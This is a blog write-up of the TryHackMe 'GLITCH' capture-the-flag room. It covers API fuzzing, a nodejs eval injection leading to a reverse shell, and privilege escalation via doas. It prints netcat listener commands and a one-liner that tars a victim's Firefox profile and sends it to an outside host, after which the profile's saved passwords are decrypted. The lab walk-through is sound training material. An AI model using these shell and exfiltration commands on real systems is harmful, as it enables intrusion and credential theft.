+++
title = 'TryHackMe — GLITCH Writeup'
date = '2023-05-16'
draft = false
tags = ["TryHackMe", "Linux"]
summary = '“Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?”'
[cover]
image = 'main.png'
+++

# Enumeration

To start off, we’ll add the machine’s IP address to the /etc/hosts file.

{{< figure src="image_1.png" caption="/etc/hosts" align="center" >}}

Next, let’s scan it with Nmap to see what we are working with.

{{< figure src="image_2.png" caption="Nmap scan" align="center" >}}

Only port **80** is open for the web server, so let’s check it out.

# Getting an access token

{{< figure src="image_3.png" caption="Initial webpage" align="center" >}}

Nothing interesting here, but notice that the page title says “*not allowed*”, hinting that we need an access token before doing anything else, as mentioned on the TryHackMe page.

Before looking at how to get the token, I was curious and wanted to check the local storage and cookies for the page.

And sure enough, there was a token cookie with no value. So once we get our access token, we’ll paste it in the cookie’s value field.

{{< figure src="image_4.png" caption="Access token cookie" align="center" >}}

Taking a look at the page’s source, we find an interesting function called `getAccess`.

{{< figure src="image_5.png" caption="Initial webpage’s source code" align="center" >}}

So let’s head to the console and call it to get our access token.

{{< figure src="image_6.png" caption="Getting the access token" align="center" >}}

The token is **base64-encoded** so we have to decode it to get the actual access token.

```bash
echo "encoded token" | base64 -d
```

Don’t forget to **update your token cookie** with the decoded string.

# Finding the first flag

{{< figure src="image_7.png" caption="New webpage after updating access token" align="center" >}}

Now we see a different web page after updating the cookie.

There’s nothing interesting on the page itself, but looking at the source code I found a **JavaScript** file containing a link to an **API endpoint**.

{{< figure src="image_8.png" caption="script.js file" align="center" >}}

Now since we don’t know what parameters we can call the API with, we can fuzz it to see what parameters it expects.

There are multiple ways to do this, but I’ll do it using [gobuster](https://github.com/OJ/gobuster).

```bash
gobuster fuzz -m POST -u http://glitch.thm/api/items?FUZZ=test -w Seclists/Discovery/Web-Content/api/objects.txt
```

One of the responses stands out, which is when we call the API using the `cmd` parameter.

{{< figure src="image_9.png" caption="gobuster results" align="center" >}}

So we’ll create a POST request to see the response.

{{< figure src="image_10.png" caption="Response to POST request" align="center" >}}

It appears that this is running on **nodejs**, so a quick Google search for something along the lines of “*nodejs eval remote code exec*” will give you more information.

To do this, I’ll use BurpSuite, modifying the command with my IP address and URL-encoding it.

First of all, start a Netcat listener.

```bash
nc -lvnp 4444
```

Then start BurpSuite and intercept a request to the API. To modify it and resend it, we’ll send the captured request to Repeater.

{{< figure src="image_11.png" caption="Captured request in BurpSuite Repeater" align="center" >}}

All we need to do now is modify the value passed in the `cmd` parameter, and change the method to POST.

After pasting the command in and modifying it, make sure to URL-encode it by selecting it and doing **right click → Convert selection → URL → URL-encode key characters**.

{{< figure src="image_12.png" align="center" >}}

Send the request and you should get a reverse shell.

The first flag is easy to find, it’s in the home directory.

{{< figure src="image_13.png" caption="First flag" align="center" >}}

# Finding the last flag

I upgraded the shell first before moving on.

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

After some digging around, the only interesting thing I found was a hidden Firefox directory.

{{< figure src="image_14.png" align="center" >}}

Let’s transfer this to our machine.

On your machine, start a new listener:

```bash
nc -l 8888 | tar xf -
```

On the GLITCH box:

```bash
cd .firefoxtar cf - . | nc <IP> 8888
```

Again, there are also multiple ways to view the passwords from the Firefox files, but I used [firefox_decrypt](https://github.com/unode/firefox_decrypt).

After switching users to **v0id**, we check what privs we have with `sudo -l`, but as the room suggests in the hint, sudo can’t be used.

{{< figure src="image_15.png" align="center" >}}

So I did some digging for SUID files using `find`.

{{< figure src="image_16.png" align="center" >}}

We see **doas**, which we can use to privsec to root and get the final flag.

{{< figure src="image_17.png" caption="Final flag" align="center" >}}